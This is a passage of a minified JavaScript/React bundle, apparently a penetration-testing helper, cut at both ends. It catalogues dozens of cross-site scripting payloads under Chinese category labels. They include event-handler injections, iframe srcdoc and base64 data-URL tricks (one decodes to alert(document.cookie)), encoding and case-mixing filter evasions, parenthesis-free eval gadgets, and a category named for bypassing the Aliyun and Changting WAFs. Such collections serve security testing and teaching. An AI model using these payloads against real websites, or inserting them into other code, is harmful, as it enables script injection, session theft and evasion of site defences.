DataUrl\u534F\u8BAE"]="Base64\u7F16\u7801 - DataUrl\u534F\u8BAE",s.HTML5="HTML5",s["\u65B0 \u6807\u7B7E"]="\u65B0 \u6807\u7B7E",s["\u65B0 \u4E8B\u4EF6/\u5C5E\u6027"]="\u65B0 \u4E8B\u4EF6/\u5C5E\u6027",s.\u6807\u7B7E\u540D="\u6807\u7B7E\u540D",s["\u975E\u6807\u51C6\u5B57\u6BCD\u3001\u82F1\u6587\u4EE5\u5916\u7684\u5B57\u6BCD"]="\u975E\u6807\u51C6\u5B57\u6BCD\u3001\u82F1\u6587\u4EE5\u5916\u7684\u5B57\u6BCD",s["\u5927\u5C0F\u5199\u4E0D\u654F\u611F\u3001\u5927\u5C0F\u5199\u6DF7\u5199"]="\u5927\u5C0F\u5199\u4E0D\u654F\u611F\u3001\u5927\u5C0F\u5199\u6DF7\u5199",s["\u6362\u884C\u7B26\u3001\u56DE\u8F66\u7B26\u3001\u7A7A\u683C\u7B26\u3001\u5236\u8868\u7B26\u3001\u6362\u9875\u7B26\u3001NUL\u7B26\u53F7"]="\u6362\u884C\u7B26\u3001\u56DE\u8F66\u7B26\u3001\u7A7A\u683C\u7B26\u3001\u5236\u8868\u7B26\u3001\u6362\u9875\u7B26\u3001NUL\u7B26\u53F7",s.\u6362\u884C\u7B26="\u6362\u884C\u7B26",s.\u56DE\u8F66\u7B26="\u56DE\u8F66\u7B26",s.\u7A7A\u683C\u7B26="\u7A7A\u683C\u7B26",s["\u4F7F\u7528\u3010/**/\u6CE8\u91CA\u3011\uFF0C\u7ED5\u8FC7\u3010\u7A7A\u683C\u3011"]="\u4F7F\u7528\u3010/**/\u6CE8\u91CA\u3011\uFF0C\u7ED5\u8FC7\u3010\u7A7A\u683C\u3011",s["\u4F7F\u7528\u3010\u6362\u9875\u7B26 0x0c \f\u3011\uFF0C\u7ED5\u8FC7\u3010\u7A7A\u683C\u3011"]="\u4F7F\u7528\u3010\u6362\u9875\u7B26 0x0c \f\u3011\uFF0C\u7ED5\u8FC7\u3010\u7A7A\u683C\u3011",s.\u5236\u8868\u7B26="\u5236\u8868\u7B26",s.\u6362\u9875\u7B26="\u6362\u9875\u7B26",s.NUL\u7B26\u53F7="NUL\u7B26\u53F7",s.\u6CE8\u91CA="\u6CE8\u91CA",s["\u4E0D\u5B8C\u6574\u6807\u7B7E\u3001\u4E0D\u95ED\u5408\u6807\u7B7E"]="\u4E0D\u5B8C\u6574\u6807\u7B7E\u3001\u4E0D\u95ED\u5408\u6807\u7B7E",s.HTML\u6807\u7B7E\u5185\u90E8\u5C5E\u6027="HTML\u6807\u7B7E\u5185\u90E8\u5C5E\u6027",s.src\u5C5E\u6027="src\u5C5E\u6027",s["\u3010\u9650\u5B9Aurl\u3011\u7684 @\u7279\u6027 \u4F7F\u7528"]="\u3010\u9650\u5B9Aurl\u3011\u7684 @\u7279\u6027 \u4F7F\u7528",s.URL\u5927\u5C0F\u5199="URL\u5927\u5C0F\u5199",s.JSFuck="JSFuck",s["\u5BF9\u3010html inline js\u3011\u7684\u8F6C\u4E49"]="\u5BF9\u3010html inline js\u3011\u7684\u8F6C\u4E49",s.\u5757\u7EA7JS\u4EE3\u7801\u5185="\u5757\u7EA7JS\u4EE3\u7801\u5185",s.eval\u76F8\u5173="eval\u76F8\u5173",s["error\u62A5\u9519\u3001Exception\u62A5\u9519"]="error\u62A5\u9519\u3001Exception\u62A5\u9519",s["function\u58F0\u660E\uFF0C\u524D\u7F6E\u7279\u6027"]="function\u58F0\u660E\uFF0C\u524D\u7F6E\u7279\u6027",s.Electron\u5E94\u7528="Electron\u5E94\u7528",s.\u57FA\u672CElectron\u8BED\u53E5="\u57FA\u672CElectron\u8BED\u53E5",s.DOM\u963B\u585E\u5668="DOM\u963B\u585E\u5668",s["\u672C\u5730\u8FC7\u6EE4\u5668\uFF08XSS Filter\uFF09"]="\u672C\u5730\u8FC7\u6EE4\u5668\uFF08XSS Filter\uFF09",s.MarkDown\u8D85\u94FE\u63A5="MarkDown\u8D85\u94FE\u63A5",s["\u7ED5\u8FC7\u963F\u91CC\u4E91\u3001\u957F\u4EADWAF"]="\u7ED5\u8FC7\u963F\u91CC\u4E91\u3001\u957F\u4EADWAF"})(a||(a={}));var B;(function(s){s.\u6982\u5FF5="\u6982\u5FF5",s["\u539F\u7406\u573A\u666F\uFF1A"]="\u539F\u7406\u573A\u666F\uFF1A",s["\u539F\u7406\uFF1A"]="\u539F\u7406\uFF1A",s["\u65E0\u6548\u573A\u5408\uFF1A"]="\u65E0\u6548\u573A\u5408\uFF1A",s["\u7F3A\u70B9\uFF1A"]="\u7F3A\u70B9\uFF1A",s["\u4F18\u70B9\uFF1A"]="\u4F18\u70B9\uFF1A",s["\u683C\u5916\u64C5\u957F\u7684\u89E3\u9898\u9886\u57DF\uFF1A"]="\u683C\u5916\u64C5\u957F\u7684\u89E3\u9898\u9886\u57DF\uFF1A",s["\u6539\u826F\uFF1A"]="\u6539\u826F\uFF1A",s["Url\u5730\u5740\u680F\uFF0C\u624B\u52A8\u8F93\u5165"]="Url\u5730\u5740\u680F\uFF0C\u624B\u52A8\u8F93\u5165",s["Url\u8DF3\u8F6C\u7684\uFF0C\u3010javascript\u534F\u8BAE\u3011+\u3010\u5B57\u7B26\u4E32\u7C7B\u578B\u3011\u3002"]="Url\u8DF3\u8F6C\u7684\uFF0C\u3010javascript\u534F\u8BAE\u3011+\u3010\u5B57\u7B26\u4E32\u7C7B\u578B\u3011\u3002",s["\u3010src\u3011\u5C5E\u6027"]="\u3010src\u3011\u5C5E\u6027",s["\u3010Url\u8DF3\u8F6C\u3011\u7684\uFF0C\u3010js\u51FD\u6570\uFF0C\u5982location\u3011+\u3010\u666E\u901A\u7F51\u5740\u3011"]="\u3010Url\u8DF3\u8F6C\u3011\u7684\uFF0C\u3010js\u51FD\u6570\uFF0C\u5982location\u3011+\u3010\u666E\u901A\u7F51\u5740\u3011",s["\u3010HTML\u3011\u7684 innerHTML\u3010\u503C\u3011 \u7684 JS"]="\u3010HTML\u3011\u7684 innerHTML\u3010\u503C\u3011 \u7684 JS",s["\u3010HTML\u3011\u7684 attribute\u3010\u503C\u3011 \u7684 JS"]="\u3010HTML\u3011\u7684 attribute\u3010\u503C\u3011 \u7684 JS",s["\u3010html inline js\u3011"]="\u3010html inline js\u3011",s["\u3010script block js\u3011"]="\u3010script block js\u3011"})(B||(B={}));var O="print()",_="javascript:print()",b=e.a.createElement(e.a.Fragment,null,e.a.createElement("div",null,"\u53EF\u4EE5\u5728\u3010",a.\u5757\u7EA7JS\u4EE3\u7801\u5185,"\u3011\u4E2D\u4F7F\u7528",e.a.createElement("ol",null,e.a.createElement("li",null,"_"))),e.a.createElement("div",null,"\u4E5F\u53EF\u4EE5\u5728\u3010",a.\u7EAFHTML\u5185,"\u3011\u3001\u3010",a.HTML\u6807\u7B7E\u5185\u90E8\u5C5E\u6027,"\u3011\u4E2D\u4F7F\u7528\u3002",e.a.createElement("ol",null,e.a.createElement("li",null,"\u6B64\u65F6\uFF0C\u4E00\u822C\u8981\u5C06\u3010error=\u3011\u6539\u5199\u6210\u3010window.onerror=\u3011\uFF0C\u80FD\u591F\u6267\u884C")))),y=function(){function s(){Object(g.a)(this,s)}return Object(c.a)(s,null,[{key:"placePayloads",value:function(){var i={};function f(C,M){["\u659C\u6760",a["/"],a.\u7A7A\u683C\u7B26].find(function(L){return String(C.value).includes(L)})}function P(C){if(C.children=C.children||[],!C.value)throw new Error("o.value \u4E0D\u5B58\u5728 ".concat(JSON.stringify(C)));var M=!!C.my_reference;if(!i[C.value]&&!M)i[C.value]=C.children;else if(!M)throw new Error("\u8BE5\u672B\u68A2\uFF0C\u5DF2\u7ECF\u5B58\u5728\uFF01 ".concat(C.value))}function D(C){C.forEach(function(M){f(M,"\u53D1\u73B0\u5916\u5C42"),!M.children||M.children.length===0?(f(M,"\u5185\u5C42\u53D1\u73B0"),P(M)):(M.children.every(function(L){return L.my_reference===!0})&&P(M),D(M.children))})}D(this.options),this.payloads.forEach(function(C){C.tag.forEach(function(M){if(i[M]){var L;(L=i[M])===null||L===void 0||L.push(Object(E.a)({},Object(F.a)(C.name,C.desc,!0)))}else throw new Error("".concat(M," \u5BF9\u5E94\u7684\u6570\u7EC4\u4E0D\u5B58\u5728\uFF01"))})})}},{key:"saveSelect_Payload",value:function(i){localStorage.setItem(this.ls_key,JSON.stringify(i))}},{key:"loadSelect_Payload",value:function(){var i=localStorage.getItem(this.ls_key);if(i)return JSON.parse(i)}}]),s}();y.ls_key="select_payload",y.payloads=[{name:`  "'><svg/onload=print(1)//  `,desc:"\u3010\u53EF\u80FD\u662F\u6700\u68D2\u7684\u57FA\u7840\u65B9\u6848\u4E86\uFF0C\u53EF\u4EE5\u540C\u65F6\u6D4B\u8BD5 \u5C5E\u6027\u3001\u5355\u72EC\u6807\u7B7E \u3011",tag:[a["2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011"],a["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:`  "'><img/onerror=print(1) src=0>//  `,desc:"\u3010\u53EF\u80FD\u662F\u6700\u68D2\u7684\u57FA\u7840\u65B9\u6848\u4E86\uFF0C\u53EF\u4EE5\u540C\u65F6\u6D4B\u8BD5 \u5C5E\u6027\u3001\u5355\u72EC\u6807\u7B7E \u3011",tag:[a["2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011"],a["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <h1>test  ",tag:[a["2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011"]]},{name:"  <svg>  ",tag:[a["2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011"]]},{name:"  <svg/onload=print(1)>  ",tag:[a["2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011"],a["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <svg/onload=print`1`>  ",tag:[a["2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011"],a["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:`  "'autofocus/onfocus=print(1)//  `,desc:"\u3010\u548C \u7B2C1\u4E2A \u901A\u7528\u6027\u4E00\u81F4\uFF0C\u7528\u4E8E \u6807\u7B7E\u5185\u5C5E\u6027 \u3011",tag:[a["2.\u6700\u57FA\u672C\u6D4B\u8BD5\uFF0C\u7528\u4E8E\u3010\u5FAA\u5E8F\u6E10\u8FDB\u3011"],a["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <script>".concat(O,"</script>  "),tag:[a.\u8F83\u5E38\u89C4]},{name:"  <script src='https://www.baidu.com' onload=print(1) ></script>  ",tag:[a.\u8F83\u5E38\u89C4]},{name:"  <script src='x:x' onerror=print(1)></script>  ",tag:[a.\u8F83\u5E38\u89C4]},{name:"  <img src='' onerror='".concat(O,"'>  "),desc:"\u3010\u6240\u6709\u7684<img>\uFF0C\u90FD\u662F\u53EF\u4EE5\u5D4C\u5165 <p>\u3001<span> \u4E2D\u7684\uFF0C\u8FD9\u662F\u5B83\u5F97\u5929\u72EC\u539A\u7684\u4F18\u52BF\u3011",tag:[a.\u8F83\u5E38\u89C4,a["<img>\u7684\u3010src\u3011"]]},{name:`  <img src='/' =_=" title="onerror='print(1)'">  `,tag:[a.\u8F83\u5E38\u89C4,a["<img>\u7684\u3010src\u3011"]]},{name:"  <svg><animate onbegin='print()' attributeName='x'></svg>  ",tag:[a.\u8F83\u5E38\u89C4]},{name:"  <details open ontoggle='print(1)'>  ",desc:"\u3010\u6709\u65F6\uFF0C\u53EF\u4EE5\u4E0D\u7528\u53F3\u95ED\u5408\u3011",tag:[a.\u8F83\u5E38\u89C4,a["\u65B0 \u6807\u7B7E"]]},{name:"  <iframe srcdoc='<svg onload=print(4);>'>  ",tag:[a.\u8F83\u5E38\u89C4,a["<iframe>\u7684\u3010srcdoc\u3011"]]},{name:"  <iframe srcdoc='<img src=x:x onerror=print(1)>' ></iframe>  ",desc:"\u3010\u6765\u81EA\u4E4C\u4E91\u3011",tag:[a.\u8F83\u5E38\u89C4,a["<img>\u7684\u3010src\u3011"],a["<iframe>\u7684\u3010srcdoc\u3011"]]},{name:"  <iframe srcdoc='<img src=x:x onerror=print(document.domain)>' ></iframe>  ",tag:[a.\u8F83\u5E38\u89C4,a["<img>\u7684\u3010src\u3011"],a["<iframe>\u7684\u3010srcdoc\u3011"]]},{name:"  <iframe src='".concat(_,"'>  "),tag:[a.\u8F83\u5E38\u89C4,a["<iframe>\u7684\u3010src\u3011"]]},{name:"  <embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+' type='image/svg+xml' AllowScriptAccess='always'></embed>  ",tag:[a.\u8F83\u5E38\u89C4,a["Base64\u7F16\u7801 - DataUrl\u534F\u8BAE"],a["<embed>\u7684\u3010src\u3011"]]},{name:"  <video src='https://www.w3cschool.cn/statics/demosource/mov_bbb.mp4' controls oncanplay=print(1)>  ",desc:"\u3010oncanplay\uFF0C\u662F\u6BD4\u8F83\u65B0\u7684\u4E8B\u4EF6\u3011",tag:[a.\u8F83\u5E38\u89C4,a["\u65B0 \u4E8B\u4EF6/\u5C5E\u6027"]]},{name:'  <iframe src="'.concat(_,';"<  '),tag:[a.\u5F88\u5947\u8469,a["<iframe>\u7684\u3010src\u3011"]]},{name:'  <iframe src="'.concat(_,';" //  '),tag:[a.\u5F88\u5947\u8469,a["<iframe>\u7684\u3010src\u3011"]]},{name:"  <iframe src=''/srcdoc='<svg onload=print(1)>'>  ",tag:[a.\u5F88\u5947\u8469,a["<iframe>\u7684\u3010src\u3011"],a["<iframe>\u7684\u3010srcdoc\u3011"]]},{name:'  /*iframe/src*/<iframe/src="<iframe/src=@"/onload=print(1) /*iframe/src*/>  ',tag:[a.\u5F88\u5947\u8469,a["<iframe>\u7684\u3010src\u3011"],a["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//  ",desc:"\u3010\u65E0\u5927\u4E2D\u5C0F\u62EC\u53F7\u3001\u65E0javascript\u3011\u2014\u2014\u3010\u53CD\u5F15\u53F7\uFF0C\u53EF\u6362\u6210 \u5355\u5F15\u53F7\u3001\u53CC\u5F15\u53F7\u3011",tag:[a.\u5F88\u5947\u8469,a.UrlEncode\u8DEF\u5F84\u7F16\u7801,a["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <img src='1' alt='al' lang='ert' onerror=top[alt+lang](0)>  ",tag:[a.\u5F88\u5947\u8469,a["<img>\u7684\u3010src\u3011"]]},{name:"  <input type='image' src onerror='print(1)'>  ",tag:[a.\u5F88\u5947\u8469]},{name:"  <input type='image' src='xxx' onerror%0A='print(1)'>  ",tag:[a.\u5F88\u5947\u8469]},{name:"  <script x> print(1) </script 1=2  ",tag:[a.\u5F88\u5947\u8469]},{name:"  <script ~~~>print(1)</script ~~~>  ",tag:[a.\u5F88\u5947\u8469]},{name:"  <script>$=1,\\u0061lert($)</script>  ",tag:[a.\u5F88\u5947\u8469,a["Unicode \u4E07\u56FD\u7801"]]},{name:"  <!--                 jaVasCript:/*-/*`/*`/*'/*\"/**/(/* */oNcliCk=print() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=print()//>>  ",desc:["-->       \u3010\u7528\u4E8E\u5904\u7406HTML\u6CE8\u91CA\u76F8\u5173\u3011",e.a.createElement("div",null,"\u771F\u6B63\u8D77\u6548\u7684\u90E8\u5206\uFF1A",e.a.createElement("ol",null,e.a.createElement("li",null,"<svg> \u7684onload\u4E8B\u4EF6")))],tag:[a.\u5F88\u5947\u8469,a.\u6CE8\u91CA,a["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:'  <input type="text" value=" jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=print() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=print()//>> "></input>  ',desc:[e.a.createElement("div",null,"\u771F\u6B63\u8D77\u6548\u7684\u90E8\u5206\uFF1A",e.a.createElement("ol",null,e.a.createElement("li",null,"<input> \u7684onclick\u4E8B\u4EF6"),e.a.createElement("li",null,"<svg> \u7684onload\u4E8B\u4EF6")))],tag:[a.\u5F88\u5947\u8469,a.\u6CE8\u91CA,a["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <input type=text value=jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=print() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=print()//>>></input>  ",desc:[e.a.createElement("div",null,"\u771F\u6B63\u8D77\u6548\u7684\u90E8\u5206\uFF1A",e.a.createElement("ol",null,e.a.createElement("li",null,"<input> \u7684onclick\u4E8B\u4EF6"),e.a.createElement("li",null,"<svg> \u7684onload\u4E8B\u4EF6")))],tag:[a.\u5F88\u5947\u8469,a.\u6CE8\u91CA,a["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <embed src='".concat(_,"'/>  "),desc:"\u4EC5FireFox\u53EF\u4EE5\uFF1A",tag:[a.\u4E2D\u53EF\u9760,a["\u65B0 \u6807\u7B7E"],a["<embed>\u7684\u3010src\u3011"]]},{name:"  <img src='".concat(_,"'></img>  "),desc:"\u6700\u65B0\u4E24\u6D4F\u89C8\u5668\u7686\u4E0D\u53EF\uFF1A",tag:[a.\u4E2D\u53EF\u9760]},{name:"  <img DYNSRC='".concat(_,"'>  "),desc:"\u6700\u65B0\u4E24\u6D4F\u89C8\u5668\u7686\u4E0D\u53EF\uFF1A",tag:[a.\u4E2D\u53EF\u9760]},{name:"  <vmlframe xmlns='urn:schemas-microsoft-com:vml' style='behavior:url(#default#vml);position:absolute;width:100%;height:100%' src='http://itsokla.duapp.com/shouzi.vml#xss'></vmlframe>  ",desc:[e.a.createElement("div",null,"\u9002\u7528\u4E8E\u65E9\u671F\u7684\u3010IE\u6D4F\u89C8\u5668\u3011 ",Object(F.c)("\u7C7B\u4F3C\u4E8E<canvas>\u4E00\u6837\u7684\u6807\u7B7E"))],tag:[a.\u4E2D\u53EF\u9760]},{name:"  <img src='' style='test:expression(".concat(O,"):'>  "),desc:"\u3010IE7\u53CA\u4EE5\u524D\u3011\uFF1A",tag:[a.\u4F4E\u53EF\u9760]},{name:"  <ImG src='' ONErROr='print(1)'>  ",desc:"",tag:[a.\u5927\u5C0F\u5199\u654F\u611F]},{name:"  <IMG src='' ONERROR='print(1)'>  ",desc:"",tag:[a.\u5927\u5C0F\u5199\u654F\u611F]},{name:'  <svg/onload=location="javascript:print%20%281%29">  ',tag:[a.UrlEncode\u8DEF\u5F84\u7F16\u7801,a["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <img src onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(1) />  ",tag:[a["Unicode \u4E07\u56FD\u7801"],a["<img>\u7684\u3010src\u3011"]]},{name:"  <img src onerror=\\u{61}\\u{6C}\\u{65}\\u{72}\\u{74}(1) />  ",tag:[a["Unicode \u4E07\u56FD\u7801"],a["<img>\u7684\u3010src\u3011"]]},{name:"  <svg><script>print&#00000000000040;1&#x0000000000029;</script></svg>  ",tag:[a["Unicode \u4E07\u56FD\u7801"]]},{name:"  <script src='https:&#x2f;&#x2f;www.segmentfault.com@127.0.0.1:20443&#x2f;test.js'></script>  ",tag:[a["Unicode \u4E07\u56FD\u7801"]]},{name:`  "'><svg/onload=location="https:&#x2f;&#x2f;www.segmentfault.com@127.0.0.1:20443&#x2f;test.js"//  `,tag:[a["Unicode \u4E07\u56FD\u7801"],a["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:`  "'><svg/onload=print&lpar;1&rpar;//  `,tag:[a.HTML\u5B9E\u4F53\u5316\u7F16\u7801,a["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:`  "'><svg/onload=location="https:&sol;&sol;www.segmentfault.com@127.0.0.1:20443&sol;test.js"//  `,tag:[a.HTML\u5B9E\u4F53\u5316\u7F16\u7801,a["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <a href='data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+'>click me</a>  ",tag:[a["Base64\u7F16\u7801 - DataUrl\u534F\u8BAE"],a["<a>\u7684\u3010href\u3011"],a["<a>\u6807\u7B7E"]]},{name:`<math>
  <maction xlink:href='javascript:`.concat(O,`'>hello world</maction>
</math>`),tag:[a["\u65B0 \u6807\u7B7E"]]},{name:"  onpageshow  ",desc:"\u3010<body>\u6807\u7B7E\uFF0C\u7684\u65B0\u4E8B\u4EF6\u3011",tag:[a["\u65B0 \u4E8B\u4EF6/\u5C5E\u6027"]]},{name:'  <SCRIPT SRC="HTTPS://127.0.0.1:20443/TEST.JS"></SCRIPT>  ',tag:[a["\u5927\u5C0F\u5199\u4E0D\u654F\u611F\u3001\u5927\u5C0F\u5199\u6DF7\u5199"]]},{name:'  <\u017Fcript src="https://127.0.0.1:20443/test.js"></script>  ',tag:[a["\u975E\u6807\u51C6\u5B57\u6BCD\u3001\u82F1\u6587\u4EE5\u5916\u7684\u5B57\u6BCD"]]},{name:"  <a href='javas%0acript:print()'>  ",desc:"\u4E2D\u95F4\u3010%0a\u3011\u662F\u6362\u884C\u7B26",tag:[a.\u6362\u884C\u7B26,a["<a>\u7684\u3010href\u3011"],a["<a>\u6807\u7B7E"]]},{name:`  </style%0a>"'><svg/onload=print(1)//  `,desc:"\u4E2D\u95F4\u3010%0a\u3011\u662F\u6362\u884C\u7B26",tag:[a.\u6362\u884C\u7B26,a["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"--!><svg><script>print&#00000000000040;1&#x0000000000029;</script>",tag:[a.\u6CE8\u91CA,a["\u7ED5\u8FC7\u963F\u91CC\u4E91\u3001\u957F\u4EADWAF"]]},{name:'<img src="xxx" onerror="print(1)"',tag:[a["\u4E0D\u5B8C\u6574\u6807\u7B7E\u3001\u4E0D\u95ED\u5408\u6807\u7B7E"]]},{name:`  "'><svg/onload=location="https://www.segmentfault.com@127.0.0.1:20443/test.js"//  `,desc:["\u4EC5 FireFox \u53EF\u4EE5"],tag:[a["\u3010\u9650\u5B9Aurl\u3011\u7684 @\u7279\u6027 \u4F7F\u7528"],a["\u4F7F\u7528\u3010\u659C\u6760\u3011\u7ED5\u8FC7\u3010\u7A7A\u683C\u7B26\u3011"]]},{name:"  <script src='https://www.segmentfault.com@127.0.0.1:20443/test.js'></script>  ",desc:["\u4EC5 FireFox \u53EF\u4EE5"],tag:[a["\u3010\u9650\u5B9Aurl\u3011\u7684 @\u7279\u6027 \u4F7F\u7528"]]},{name:'SCRIPT SRC="HTTPS://WWW.SEGMENTFAULT.COM@127.0.0.1:20443/TEST.JS"></SCRIPT><',tag:[a.URL\u5927\u5C0F\u5199]},{name:'  <img src="x" onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>  ',tag:[a["Unicode \u4E07\u56FD\u7801"]]},{name:`<script>
<!--  11233123
  <!-- 123123
print(1)
  -->123
</script>`,tag:[a.\u6CE8\u91CA]},{name:`<script>
  var url = 'javascript:console.log("\\");print(1)\\/\\/")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
</script>`,tag:[a["\u3010\\\u53CD\u659C\u6760\u3011\u8F6C\u4E49"]]},{name:'<script>console.log("\\\\");print(1)//");</script>',tag:[a["\u3010\\\u53CD\u659C\u6760\u3011\u8F6C\u4E49"]]},{name:"  onerror=print;throw'XSS'  ",desc:[b],tag:[a.eval\u76F8\u5173,a["error\u62A5\u9519\u3001Exception\u62A5\u9519"],a["()"]]},{name:"  throw onerror = print, 'some string', 123, 'haha'  ",desc:[b],tag:[a.eval\u76F8\u5173,a["error\u62A5\u9519\u3001Exception\u62A5\u9519"],a["()"],a[";"]]},{name:"  {onerror=print}throw 1  ",desc:[b],tag:[a.eval\u76F8\u5173,a["error\u62A5\u9519\u3001Exception\u62A5\u9519"],a["()"],a[";"],a[","]]},{name:"  onerror=eval;throw'=print\\x281\\x29'  ",desc:[b],tag:[a.eval\u76F8\u5173,a["error\u62A5\u9519\u3001Exception\u62A5\u9519"],a["ASCII \u7F8E\u56FD\u7801"],a["()"]]},{name:"{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:'',message:'print\\x281\\x29'}",desc:["FireFox\u4E13\u7528",b],tag:[a.eval\u76F8\u5173,a["error\u62A5\u9519\u3001Exception\u62A5\u9519"],a["ASCII \u7F8E\u56FD\u7801"],a["()"],a[";"]]},{name:"eval( 8680439..toString(30) )",desc:["\u539F\u7406\uFF1A\u3010800..\u3011\u7684\u6548\u679C\uFF0C\u548C\u3010 (800) \u3011\u6548\u679C\u4E00\u81F4\u3002  \u53C2\u8003\u8D44\u6599\uFF1Ahttps://stackoverflow.com/a/4211641/6264260",b,"\u5173\u4E8EError\u62A5\u9519\u7684\u8FD9\u5757\uFF0C\u8FD8\u6CA1\u6709\u6B63\u5F0F\u8BD5\u9A8C\u8FC7"],tag:[a.eval\u76F8\u5173,a["error\u62A5\u9519\u3001Exception\u62A5\u9519"],a["."]]},{name:'  window.open("https://www\u3002baidu\u3002com")  ',desc:["\u4F7F\u7528\u3010\u3002\u4E2D\u6587\u70B9\u53F7\u3011\u2014\u2014\u2014\u2014\u7ED5\u8FC7\u3010.\u82F1\u6587\u70B9\u53F7\u3011\u2014\u2014\u2014\u2014\u6765\u5E94\u5BF9 IP/\u57DF\u540D"],tag:[a["."]]},{name:"  throw/a/,a=URL+0,g=print,onerror=eval,{lineNumber:1,columnNumber:1,fileName:0,message:0+/1/g+a[12]+[1337,331,337]+a[13]}  ",desc:["FireFox\u4E13\u7528","\u907F\u514D\u4E86\u3010\u5B57\u7B26\u4E32\u53D8\u91CF\u3011\u7684\u4F7F\u7528",b],tag:[a.eval\u76F8\u5173,a["error\u62A5\u9519\u3001Exception\u62A5\u9519"],a.\u5B57\u7B26\u4E32\u53D8\u91CF]},{name:"  TypeError.prototype.name='=/',0[onerror=eval]['/-print(1)//']  ",desc:["\u907F\u514D\u4E86\u3010throw\u3011\u5173\u952E\u5B57\u7684\u4F7F\u7528",b],tag:[a.eval\u76F8\u5173,a["error\u62A5\u9519\u3001Exception\u62A5\u9519"]]},{name:'"&ss=aaaa\\"+"&from==1;function/**/from(){}',desc:[e.a.createElement(e.a.Fragment,null,"\u3010from\u3011\u53D8\u91CF\u88AB\u63D0\u524D\u4F7F\u7528 ",Object(F.c)("\u6216\u8005\uFF0C\u672C\u6765\u5C31\u65E0\u3010\u6B64\u53D8\u91CF\u3011")),"\u3010function\u58F0\u660E\u3011\uFF0C\u53EF\u4EE5\u5C06\u81EA\u5DF1\u3010\u524D\u7F6E\u3011","\u4F7F\u7528\u3010/**/\u3011\u4EE3\u66FF\u4E86\uFF0C\u5FC5\u9700\u8981\u7684 \u7A7A\u683C"],tag:[a["function\u58F0\u660E\uFF0C\u524D\u7F6E\u7279\u6027"],a["\u4F7F\u7528\u3010/**/\u6CE8\u91CA\u3011\uFF0C\u7ED5\u8FC7\u3010\u7A7A\u683C\u3011"],a.\u6CE8\u91CA]},{name:`<script>
// \u7B2C\u4E00\u79CD
document.getElementsByTagName("div")[0].innerHTML="<img src onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(1) />";

// \u7B2C\u4E8C\u79CD
eval ("\\u0061\\u006C\\u0065\\u0072\\u0074(1)")

// \u7B2C\u4E09\u79CD
\\u0061\\u006C\\u0065\\u0072\\u0074(1)
